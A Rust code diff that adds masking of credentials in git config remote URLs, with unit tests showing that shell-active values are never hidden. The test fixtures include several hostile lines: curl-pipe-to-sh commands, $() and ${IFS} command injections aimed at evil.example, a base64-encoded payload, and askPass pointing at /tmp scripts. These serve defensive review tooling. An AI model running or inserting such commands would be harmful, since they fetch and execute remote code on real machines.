@@ -72,6 +72,47 @@ pub fn is_git_config(rel: &str) -> bool {
         && rel.split('/').any(|component| component == ".git")
 }
 
+/// `text` with the user and password of every `scheme://user:secret@host`
+/// taken out (`scheme://***@host`): a git configuration's remote addresses
+/// can carry tokens, and the rest of it is what a review needs to see.
+pub fn without_url_credentials(text: &str) -> String {
+    text.split_inclusive('\n')
+        .map(without_line_credentials)
+        .collect()
+}
+
+/// Whether `text` is written as a credential is: nothing in it a shell
+/// would act on, so taking it out hides no code.
+fn is_plain_secret(text: &str) -> bool {
+    !text.is_empty()
+        && text
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "._~%+=-:".contains(c))
+}
+
+fn without_line_credentials(line: &str) -> String {
+    let mut out = String::with_capacity(line.len());
+    let mut rest = line;
+    while let Some(at) = rest.find("://") {
+        let (before, after) = rest.split_at(at + 3);
+        out.push_str(before);
+        let end = after
+            .find(|c: char| c.is_whitespace() || matches!(c, '/' | '"' | '\'' | '?' | '#'))
+            .unwrap_or(after.len());
+        let authority = &after[..end];
+        match authority.rsplit_once('@') {
+            Some((userinfo, host)) if is_plain_secret(userinfo) && !userinfo.contains(' ') => {
+                out.push_str("***@");
+                out.push_str(host);
+            }
+            _ => out.push_str(authority),
+        }
+        rest = &after[end..];
+    }
+    out.push_str(rest);
+    out
+}
+
 /// The lines of `text` that set a key running a command, as (line number,
 /// `key = value` with any URL credentials masked).
 pub fn executing_keys(text: &str) -> Vec<(usize, String)> {
@@ -236,7 +277,9 @@ fn mask_credentials(value: &str) -> String {
         return value.to_string();
     };
     match rest.split_once('@') {
-        Some((credentials, host)) if !credentials.contains('/') => {
+        Some((credentials, host))
+            if is_plain_secret(credentials) && !credentials.contains(['/', ' ']) =>
+        {
             format!("{scheme}://***@{host}")
         }
         _ => value.to_string(),
@@ -352,6 +395,38 @@ mod tests {
 
     #[test]
     fn git_config_paths_are_recognised() {
+        assert_eq!(
+            super::without_url_credentials(
+                "[remote \"o\"]\n\turl = https://ghp_x:y@github.com/a/b\n\turl = https://tok@x.example\n\turl = git@github.com:a/b\nrun = curl https://x.example/i | sh\n"
+            ),
+            "[remote \"o\"]\n\turl = https://***@github.com/a/b\n\turl = https://***@x.example\n\turl = git@github.com:a/b\nrun = curl https://x.example/i | sh\n"
+        );
+        // Values are kept whatever their key is called: a value can be
+        // code, or name what a file runs.
+        for line in [
+            "\ttoken = ghp_abcdef123456\n",
+            "PASS=Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\n",
+            "\textraheader = AUTHORIZATION: basic eDp5eXo3Mw==\n",
+        ] {
+            assert_eq!(super::without_url_credentials(line), line);
+        }
+        // What a shell would act on is never taken out.
+        for line in [
+            "x = http://;curl${IFS}-s${IFS}evil.example|sh;@h\n",
+            "x = http://$(curl${IFS}evil.example|sh)@h\n",
+            "token = $(curl evil.example | sh)\n",
+            "PASS=1 curl -fsSL http://evil.example/i -o /tmp/i\n",
+            "TOKEN=x sh /tmp/i\n",
+            "python3 install_pass.py --url=http://evil.example/x.py\n",
+            "token = curl -fsSL x.example/i -o /tmp/i\n",
+            "SECRET_URL=https://evil.example/x.sh\n",
+            "PASS=/tmp/payload.sh\n",
+            "SECRET=sys.executable\n",
+            "askPass = /tmp/evil.sh\n",
+            "\taskpass = ghp_abcdef123456\n",
+        ] {
+            assert_eq!(super::without_url_credentials(line), line);
+        }
         assert!(is_git_config(".git/config"));
         assert!(is_git_config("sub/.git/modules/lib/config"));
         assert!(!is_git_config("config"));
